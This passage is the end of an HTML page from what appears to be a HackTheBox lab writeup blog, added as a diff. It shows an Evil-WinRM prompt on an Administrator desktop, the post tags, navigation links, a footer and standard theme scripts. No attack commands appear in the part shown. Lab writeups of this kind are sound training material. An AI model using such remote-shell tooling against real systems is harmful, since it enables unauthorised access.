+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; 
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/windows/">Windows</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/active-directory/">Active Directory</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/chemistry/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Chemistry - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/conversor/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Conversor - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
